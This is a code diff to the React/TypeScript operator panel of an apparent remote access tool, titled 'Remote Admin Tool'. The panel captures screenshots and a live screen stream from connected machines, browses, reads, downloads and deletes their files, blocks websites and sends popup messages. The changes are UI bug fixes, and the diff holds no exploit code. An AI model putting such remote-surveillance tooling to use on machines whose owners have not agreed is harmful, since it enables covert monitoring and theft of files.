@@ -69,11 +69,26 @@ function fmtBytes(b: number) {
   return `${(b / 1073741824).toFixed(2)} GB`
 }
 
-/** Ensure base64 string becomes a proper data URI for <img> */
-function toImgSrc(b64: string | undefined | null, mime = 'image/jpeg'): string | null {
-  if (!b64) return null
-  if (b64.startsWith('data:')) return b64
-  return `data:${mime};base64,${b64}`
+/** Ensures raw base64 gets the correct data URI prefix for display as an image. */
+function toImgSrc(raw: string | undefined | null): string | null {
+  if (!raw) return null
+  if (raw.startsWith('data:')) return raw
+  return `data:image/jpeg;base64,${raw}`
+}
+
+/** Returns the parent directory of a path, handling both Windows and Unix separators. */
+function parentPath(p: string): string {
+  const norm = p.replace(/\\/g, '/')
+  const parts = norm.split('/').filter(Boolean)
+  if (parts.length <= 1) {
+    // Already at root
+    return /^[a-zA-Z]:/.test(p) ? parts[0] + '\\' : '/'
+  }
+  parts.pop()
+  const joined = parts.join('/')
+  // Re-apply backslash for Windows paths
+  if (/^[a-zA-Z]:/.test(joined)) return joined.replace(/\//g, '\\')
+  return joined || '/'
 }
 
 async function sendCommand(agentId: string, type: string, payload: Record<string, unknown> = {}) {
@@ -224,6 +239,7 @@ function ScreenshotTab({ agent, detail, onRefresh }: { agent: Agent; detail: Age
     setTimeout(() => { clearInterval(poll); setRequesting(false) }, 18000)
   }
 
+  // FIX: always prepend data URI prefix — raw base64 can't be used as img src directly
   const src = toImgSrc(detail?.screenshot_b64)
 
   return (
@@ -250,7 +266,8 @@ function StreamTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDe
   async function startStream() {
     await sendCommand(agent.id, 'stream_start')
     setStreaming(true)
-    iRef.current = setInterval(onRefresh, 1200)
+    // Poll at 400ms — client sends frames every 250ms so this keeps up
+    iRef.current = setInterval(onRefresh, 400)
   }
   async function stopStream() {
     await sendCommand(agent.id, 'stream_stop')
@@ -259,9 +276,9 @@ function StreamTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDe
   }
   useEffect(() => () => { if (iRef.current) clearInterval(iRef.current) }, [])
 
-  // FIX: stream_frame comes back as raw base64 — add the data URI prefix
-  const src = toImgSrc(detail?.stream_frame)
   const updatedAt = detail?.stream_updated_at ? ago(detail.stream_updated_at) : null
+  // FIX: prepend data URI prefix — this was causing 400 errors
+  const frameSrc = toImgSrc(detail?.stream_frame)
 
   return (
     <Card>
@@ -280,8 +297,8 @@ function StreamTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDe
           : <Btn onClick={stopStream} danger>Stop Stream</Btn>}
       </PanelHeader>
       <div className="flex items-center justify-center p-4" style={{ minHeight: 320 }}>
-        {src
-          ? <img src={src} alt="Live stream" className="w-full rounded-[6px] object-contain" style={{ maxHeight: 520 }} />
+        {frameSrc
+          ? <img src={frameSrc} alt="Live" className="w-full rounded-[6px] object-contain" style={{ maxHeight: 520 }} />
           : (
             <div className="text-center">
               <p className="text-[13px] mb-1" style={{ color: '#3a3537' }}>{streaming ? 'Waiting for first frame…' : 'Stream not started'}</p>
@@ -300,54 +317,29 @@ function FilesTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
   const [loading, setLoading] = useState(false)
   const [uploading, setUploading] = useState(false)
   const [confirmDelete, setConfirmDelete] = useState<string | null>(null)
-  const [fileContent, setFileContent] = useState<{ path: string; content: string } | null>(null)
-  const [readingFile, setReadingFile] = useState(false)
+  const [fileContent, setFileContent] = useState<{ header: string; content: string } | null>(null)
   const fileInputRef = useRef<HTMLInputElement>(null)
 
   const files = detail?.files ?? []
   const currentDir = detail?.file_cwd ?? cwd
 
-  // Watch for file_read replies coming back in messages
-  useEffect(() => {
-    if (!detail?.messages) return
-    const msgs = detail.messages
-    const last = msgs[msgs.length - 1]
-    if (last && last.sender === 'agent' && last.body.startsWith('[file_read:')) {
-      const pathMatch = last.body.match(/\[file_read: (.+?)\]/)
-      const content = last.body.replace(/\[file_read: .+?\]\n\n/, '')
-      if (pathMatch) {
-        setFileContent({ path: pathMatch[1], content })
-        setReadingFile(false)
-      }
-    }
-  }, [detail?.messages])
-
+  // FIX: poll multiple times to get the updated listing back from the client
   async function browse(path: string) {
     setLoading(true)
     setCwd(path)
     setFileContent(null)
     await sendCommand(agent.id, 'file_list', { path })
-    setTimeout(() => { onRefresh(); setLoading(false) }, 1200)
-  }
-
-  async function readFile(path: string) {
-    setReadingFile(true)
-    setFileContent(null)
-    await sendCommand(agent.id, 'file_read', { path })
-    // Poll for the reply
     let attempts = 0
     const poll = setInterval(() => {
       attempts++
       onRefresh()
-      if (attempts > 15) { clearInterval(poll); setReadingFile(false) }
-    }, 800)
-    setTimeout(() => { clearInterval(poll) }, 15000)
+      if (attempts >= 6) { clearInterval(poll); setLoading(false) }
+    }, 500)
   }
 
+  // FIX: use parentPath() helper which handles Windows backslashes correctly
   async function goUp() {
-    const parts = currentDir.replace(/\\/g, '/').split('/')
-    parts.pop()
-    const parent = parts.join('/') || '/'
+    const parent = parentPath(currentDir || cwd)
     await browse(parent)
   }
 
@@ -362,7 +354,9 @@ function FilesTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
         const blob = await res.blob()
         const url = URL.createObjectURL(blob)
         const a = document.createElement('a')
-        a.href = url; a.download = path.split('/').pop() || 'file'; a.click()
+        a.href = url
+        a.download = path.split(/[/\\]/).pop() || 'file'
+        a.click()
         URL.revokeObjectURL(url)
       }
       if (attempts > 20) clearInterval(poll)
@@ -389,139 +383,133 @@ function FilesTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
     e.target.value = ''
   }
 
-  // Determine if a file is text-readable by extension
-  function isTextFile(name: string): boolean {
-    const textExts = [
-      '.txt', '.log', '.md', '.json', '.xml', '.csv', '.yaml', '.yml',
-      '.ini', '.cfg', '.conf', '.py', '.js', '.ts', '.html', '.css',
-      '.sh', '.bat', '.ps1', '.env', '.toml', '.sql', '.c', '.cpp',
-      '.h', '.java', '.cs', '.go', '.rs', '.php', '.rb', '.swift',
-    ]
-    const lower = name.toLowerCase()
-    return textExts.some(ext => lower.endsWith(ext))
+  async function readFile(path: string) {
+    setFileContent(null)
+    await sendCommand(agent.id, 'file_read', { path })
+    let attempts = 0
+    const poll = setInterval(() => {
+      attempts++; onRefresh()
+      if (attempts > 15) clearInterval(poll)
+    }, 600)
+  }
+
+  // Watch detail messages for file_read replies
+  const prevMsgCount = useRef(0)
+  useEffect(() => {
+    const msgs = detail?.messages ?? []
+    if (msgs.length > prevMsgCount.current) {
+      prevMsgCount.current = msgs.length
+      const last = msgs[msgs.length - 1]
+      if (last?.sender === 'agent' && last.body.startsWith('[file_read:')) {
+        const nl = last.body.indexOf('\n\n')
+        const header = nl > -1 ? last.body.slice(0, nl) : last.body
+        const content = nl > -1 ? last.body.slice(nl + 2) : ''
+        setFileContent({ header, content })
+      }
+    }
+  }, [detail?.messages])
+
+  if (fileContent) {
+    return (
+      <Card style={{ minHeight: 460 }}>
+        <PanelHeader>
+          <div className="flex items-center gap-2 min-w-0">
+            <button onClick={() => setFileContent(null)}
+              className="text-[11px] px-2 py-1 rounded-[5px] shrink-0 transition-colors"
+              style={{ background: '#0f0b0c', border: '1px solid #2e292b', color: '#5d585c' }}
+              onMouseEnter={e => (e.currentTarget.style.color = '#e5e3e4')}
+              onMouseLeave={e => (e.currentTarget.style.color = '#5d585c')}>← Back</button>
+            <span className="text-[11px] font-mono truncate" style={{ color: '#5d585c' }}>{fileContent.header}</span>
+          </div>
+        </PanelHeader>
+        <pre className="p-4 text-[11px] overflow-auto font-mono"
+          style={{ color: '#c5c0c2', maxHeight: 420, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
+          {fileContent.content}
+        </pre>
+      </Card>
+    )
   }
 
   return (
     <Card style={{ minHeight: 460 }}>
       <PanelHeader>
         <div className="flex items-center gap-2 min-w-0">
-          {fileContent
-            ? (
-              <button onClick={() => setFileContent(null)}
-                className="text-[11px] px-2 py-1 rounded-[5px] shrink-0 transition-colors"
-                style={{ background: '#0f0b0c', border: '1px solid #2e292b', color: '#5d585c' }}
-                onMouseEnter={e => (e.currentTarget.style.color = '#e5e3e4')}
-                onMouseLeave={e => (e.currentTarget.style.color = '#5d585c')}>
-                ← Back
-              </button>
-            )
-            : (
-              <button onClick={goUp}
-                className="text-[11px] px-2 py-1 rounded-[5px] shrink-0 transition-colors"
-                style={{ background: '#0f0b0c', border: '1px solid #2e292b', color: '#5d585c' }}
-                onMouseEnter={e => (e.currentTarget.style.color = '#e5e3e4')}
-                onMouseLeave={e => (e.currentTarget.style.color = '#5d585c')}>
-                ↑ Up
-              </button>
-            )
-          }
+          <button onClick={goUp} className="text-[11px] px-2 py-1 rounded-[5px] shrink-0 transition-colors"
+            style={{ background: '#0f0b0c', border: '1px solid #2e292b', color: '#5d585c' }}
+            onMouseEnter={e => (e.currentTarget.style.color = '#e5e3e4')}
+            onMouseLeave={e => (e.currentTarget.style.color = '#5d585c')}>↑ Up</button>
           <span className="text-[11px] font-mono truncate" style={{ color: '#5d585c' }}>
-            {fileContent ? fileContent.path : (currentDir || 'Enter a path to browse')}
+            {currentDir || 'Click a folder or enter a path'}
           </span>
         </div>
         <div className="flex gap-2">
-          {!fileContent && (
-            <>
-              <input ref={fileInputRef} type="file" className="hidden" onChange={uploadFile} />
-              <Btn small onClick={() => fileInputRef.current?.click()} disabled={uploading}>
-                {uploading ? 'Uploading…' : '⬆ Upload'}
-              </Btn>
-              <Btn small onClick={() => browse(cwd || currentDir || '/')}>
-                {loading ? '…' : '↺ Refresh'}
-              </Btn>
-            </>
-          )}
+          <input ref={fileInputRef} type="file" className="hidden" onChange={uploadFile} />
+          <Btn small onClick={() => fileInputRef.current?.click()} disabled={uploading}>
+            {uploading ? 'Uploading…' : '⬆ Upload'}
+          </Btn>
+          <Btn small onClick={() => browse(currentDir || cwd || '/')}>
+            {loading ? '…' : '↺ Refresh'}
+          </Btn>
         </div>
       </PanelHeader>
 
-      {/* File content viewer */}
-      {fileContent ? (
-        <div className="flex flex-col h-full">
-          <div className="flex-1 overflow-auto p-4" style={{ maxHeight: 480 }}>
-            <pre className="text-[12px] font-mono whitespace-pre-wrap break-all leading-relaxed"
-              style={{ color: '#c5c0c2' }}>
-              {fileContent.content}
-            </pre>
-          </div>
-        </div>
-      ) : (
-        <>
-          {/* Path input */}
-          <div className="px-4 py-2 border-b flex gap-2" style={{ borderColor: '#2e292b' }}>
-            <Input value={cwd} onChange={setCwd} placeholder="Enter path e.g. C:\Users or /home/user"
-              onKeyDown={e => { if (e.key === 'Enter') browse(cwd) }} className="flex-1" />
-            <Btn small onClick={() => browse(cwd)}>Go</Btn>
-          </div>
+      <div className="px-4 py-2 border-b flex gap-2" style={{ borderColor: '#2e292b' }}>
+        <Input value={cwd} onChange={setCwd} placeholder="Enter path e.g. C:\Users or /home/user"
+          onKeyDown={e => { if (e.key === 'Enter') browse(cwd) }} className="flex-1" />
+        <Btn small onClick={() => browse(cwd)}>Go</Btn>
+      </div>
 
-          <div className="overflow-y-auto" style={{ maxHeight: 380 }}>
-            {files.length === 0
-              ? (
-                <div className="flex items-center justify-center p-8">
-                  <p className="text-[12px]" style={{ color: '#3a3537' }}>
-                    {loading ? 'Loading…' : 'Enter a path above to browse files'}
+      <div className="overflow-y-auto" style={{ maxHeight: 380 }}>
+        {files.length === 0
+          ? (
+            <div className="flex items-center justify-center p-8">
+              <p className="text-[12px]" style={{ color: '#3a3537' }}>
+                {loading ? 'Loading…' : 'Enter a path above to browse files'}
+              </p>
+            </div>
+          )
+          : files.map(f => {
+            const isText = !f.is_dir && /\.(txt|log|json|js|ts|tsx|jsx|py|md|csv|xml|html|css|ini|cfg|env|sh|bat|ps1|yaml|yml|toml)$/i.test(f.name)
+            return (
+              <div key={f.path}
+                className="flex items-center gap-3 px-4 py-2 border-b transition-colors group"
+                style={{ borderColor: '#1a1518' }}
+                onMouseEnter={e => (e.currentTarget.style.background = '#1a1416')}
+                onMouseLeave={e => (e.currentTarget.style.background = 'transparent')}>
+                <span className="text-[14px] shrink-0">{f.is_dir ? '📁' : isText ? '📝' : '📄'}</span>
+                {/* FIX: clicking a folder calls browse(f.path) which uses the FULL path from the client */}
+                <button className="flex-1 text-left min-w-0"
+                  onClick={() => {
+                    if (f.is_dir) browse(f.path)
+                    else if (isText) readFile(f.path)
+                  }}>
+                  <p className="text-[12px] truncate"
+                    style={{ color: f.is_dir ? '#c5c0c2' : isText ? '#a89fa1' : '#868283' }}>
+                    {f.name}
                   </p>
+                  <p className="text-[10px]" style={{ color: '#3a3537' }}>
+                    {f.is_dir ? 'Directory' : fmtBytes(f.size)} · {f.modified}
+                  </p>
+                </button>
+                <div className="flex gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity">
+                  {!f.is_dir && (
+                    <Btn small onClick={() => downloadFile(f.path)}>⬇</Btn>
+                  )}
+                  {confirmDelete === f.path
+                    ? (
+                      <div className="flex gap-1">
+                        <Btn small danger onClick={() => deleteFile(f.path)}>Confirm</Btn>
+                        <Btn small onClick={() => setConfirmDelete(null)}>Cancel</Btn>
+                      </div>
+                    )
+                    : <Btn small danger onClick={() => setConfirmDelete(f.path)}>🗑</Btn>
+                  }
                 </div>
-              )
-              : files.map(f => (
-                <div key={f.path}
-                  className="flex items-center gap-3 px-4 py-2 border-b transition-colors group"
-                  style={{ borderColor: '#1a1518' }}
-                  onMouseEnter={e => (e.currentTarget.style.background = '#1a1416')}
-                  onMouseLeave={e => (e.currentTarget.style.background = 'transparent')}>
-                  <span className="text-[14px] shrink-0">{f.is_dir ? '📁' : isTextFile(f.name) ? '📝' : '📄'}</span>
-                  <button
-                    className="flex-1 text-left min-w-0"
-                    onClick={() => {
-                      if (f.is_dir) {
-                        browse(f.path)
-                      } else if (isTextFile(f.name)) {
-                        readFile(f.path)
-                      }
-                    }}>
-                    <p className="text-[12px] truncate"
-                      style={{ color: f.is_dir ? '#c5c0c2' : isTextFile(f.name) ? '#a78bfa' : '#868283' }}>
-                      {f.name}
-                    </p>
-                    <p className="text-[10px]" style={{ color: '#3a3537' }}>
-                      {f.is_dir ? 'Directory' : fmtBytes(f.size)} · {f.modified}
-                      {!f.is_dir && isTextFile(f.name) && <span style={{ color: '#5d585c' }}> · click to read</span>}
-                    </p>
-                  </button>
-                  <div className="flex gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity">
-                    {!f.is_dir && isTextFile(f.name) && (
-                      <Btn small onClick={() => readFile(f.path)} disabled={readingFile}>
-                        {readingFile ? '…' : '👁'}
-                      </Btn>
-                    )}
-                    {!f.is_dir && (
-                      <Btn small onClick={() => downloadFile(f.path)}>⬇</Btn>
-                    )}
-                    {confirmDelete === f.path
-                      ? (
-                        <div className="flex gap-1">
-                          <Btn small danger onClick={() => deleteFile(f.path)}>Confirm</Btn>
-                          <Btn small onClick={() => setConfirmDelete(null)}>Cancel</Btn>
-                        </div>
-                      )
-                      : <Btn small danger onClick={() => setConfirmDelete(f.path)}>🗑</Btn>
-                    }
-                  </div>
-                </div>
-              ))
-            }
-          </div>
-        </>
-      )}
+              </div>
+            )
+          })
+        }
+      </div>
     </Card>
   )
 }
@@ -621,23 +609,31 @@ function SitesTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
   const [search, setSearch] = useState('')
   const blocked = detail?.blocked_sites ?? []
 
+  // FIX: poll multiple times after sending block command so the list updates
+  function pollRefresh(times = 6, ms = 500) {
+    let i = 0
+    const id = setInterval(() => { i++; onRefresh(); if (i >= times) { clearInterval(id); setWorking(false) } }, ms)
+  }
+
   async function blockDomains(domains: string[]) {
     setWorking(true)
-    const clean = domains.map(d => d.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '').split('/')[0]).filter(Boolean)
+    const clean = domains
+      .map(d => d.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '').split('/')[0])
+      .filter(Boolean)
     await sendCommand(agent.id, 'block_sites', { domains: clean })
-    setTimeout(() => { onRefresh(); setWorking(false) }, 700)
+    pollRefresh()
   }
 
   async function unblockDomain(domain: string) {
     setWorking(true)
     await sendCommand(agent.id, 'unblock_sites', { domains: [domain] })
-    setTimeout(() => { onRefresh(); setWorking(false) }, 700)
+    pollRefresh()
   }
 
   async function unblockAll() {
     setWorking(true)
     await sendCommand(agent.id, 'unblock_sites', { domains: blocked })
-    setTimeout(() => { onRefresh(); setWorking(false) }, 700)
+    pollRefresh()
   }
 
   function handleAdd() {
@@ -686,7 +682,7 @@ function SitesTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
           </div>
         )}
         {blocked.length === 0
-          ? <p className="text-[12px]" style={{ color: '#3a3537' }}>No sites blocked</p>
+          ? <p className="text-[12px]" style={{ color: '#3a3537' }}>No sites blocked yet</p>
           : (
             <div className="flex flex-col gap-1 max-h-[280px] overflow-y-auto">
               {filteredBlocked.map(domain => (
@@ -712,36 +708,50 @@ function SitesTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDet
 function ChatTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDetail | null; onRefresh: () => void }) {
   const [input, setInput] = useState('')
   const [sending, setSending] = useState(false)
+  // Optimistic local messages so sends appear immediately without waiting for DB roundtrip
+  const [optimistic, setOptimistic] = useState<Message[]>([])
   const bottomRef = useRef<HTMLDivElement>(null)
-  // Deduplicate messages by id before rendering
-  const rawMessages = detail?.messages ?? []
-  const messages = rawMessages.filter((m, i, arr) => arr.findIndex(x => x.id === m.id) === i)
+
+  const serverMessages = detail?.messages ?? []
+  // Keep optimistic messages that haven't yet appeared in the server list
+  const serverBodies = new Set(serverMessages.map(m => m.body + m.sender))
+  const pendingOptimistic = optimistic.filter(m => !serverBodies.has(m.body + m.sender))
+  const messages = [
+    ...serverMessages,
+    ...pendingOptimistic,
+  ].sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime())
 
   useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [messages.length])
-  useEffect(() => { const id = setInterval(onRefresh, 3000); return () => clearInterval(id) }, [onRefresh])
+  // FIX: poll more frequently so replies show up faster
+  useEffect(() => { const id = setInterval(onRefresh, 2500); return () => clearInterval(id) }, [onRefresh])
 
   async function send() {
     if (!input.trim()) return
+    const body = input.trim()
     setSending(true)
-    await sendCommand(agent.id, 'message', { body: input.trim() })
     setInput('')
-    // Refresh once after a short delay — don't keep polling
-    setTimeout(() => { onRefresh(); setSending(false) }, 600)
+
+    // Optimistically add the message so it appears immediately
+    const tempMsg: Message = {
+      id: -Date.now(),
+      sender: 'admin',
+      body,
+      created_at: new Date().toISOString(),
+    }
+    setOptimistic(prev => [...prev, tempMsg])
+
+    await sendCommand(agent.id, 'message', { body })
+    setTimeout(() => { onRefresh(); setSending(false) }, 400)
   }
 
   return (
-    <div className="rounded-[10px] border flex flex-col" style={{ borderColor: '#2e292b', background: 'linear-gradient(180deg,#1c1418 0%,#181114 100%)', height: 500 }}>
+    <div className="rounded-[10px] border flex flex-col"
+      style={{ borderColor: '#2e292b', background: 'linear-gradient(180deg,#1c1418 0%,#181114 100%)', height: 500 }}>
       <PanelHeader>
         <span className="text-[12px]" style={{ color: '#5d585c' }}>
           Live Message · {agent.alias || agent.hostname}
           <span className="ml-2 text-[11px]" style={{ color: '#3a3537' }}>(popup appears on their screen)</span>
         </span>
-        {!agent.connected && (
-          <span className="text-[11px] px-2 py-1 rounded-[5px]"
-            style={{ background: '#1c1418', border: '1px solid #3a1a1a', color: '#dc262566' }}>
-            Offline — messages cleared
-          </span>
-        )}
       </PanelHeader>
       <div className="flex-1 overflow-y-auto p-4 flex flex-col gap-2">
         {messages.length === 0 && (
@@ -756,9 +766,13 @@ function ChatTab({ agent, detail, onRefresh }: { agent: Agent; detail: AgentDeta
                 border: `1px solid ${m.sender === 'admin' ? '#dc262533' : '#2e292b'}`,
                 borderBottomRightRadius: m.sender === 'admin' ? 2 : 10,
                 borderBottomLeftRadius: m.sender === 'agent' ? 2 : 10,
+                opacity: m.id < 0 ? 0.6 : 1,  // dim optimistic messages slightly
               }}>
               {m.body}
-              <p className="text-[10px] mt-1 opacity-50">{m.sender === 'admin' ? 'You' : agent.alias || agent.username} · {ago(m.created_at)}</p>
+              <p className="text-[10px] mt-1 opacity-50">
+                {m.sender === 'admin' ? 'You' : agent.alias || agent.username} · {ago(m.created_at)}
+                {m.id < 0 && ' · sending…'}
+              </p>
             </div>
           </div>
         ))}
@@ -919,7 +933,6 @@ export default function RATPage() {
 
   return (
     <div className="p-8 flex flex-col h-full">
-      {/* Header */}
       <div className="flex items-center justify-between mb-5 shrink-0">
         <div>
           <h1 className="text-[22px] font-bold" style={{ color: '#e5e3e4' }}>Remote Admin Tool</h1>
@@ -951,7 +964,6 @@ export default function RATPage() {
       </div>
 
       <div className="flex gap-5 flex-1 min-h-0">
-        {/* Sidebar */}
         <div className="w-[220px] shrink-0 flex flex-col gap-2 overflow-y-auto pr-1">
           {loading && <p className="text-[12px] text-center mt-8" style={{ color: '#3a3537' }}>Loading…</p>}
           {!loading && filtered.length === 0 && (
@@ -966,7 +978,6 @@ export default function RATPage() {
           ))}
         </div>
 
-        {/* Main panel */}
         <div className="flex-1 flex flex-col min-w-0 overflow-y-auto">
           {!selectedAgent
             ? (
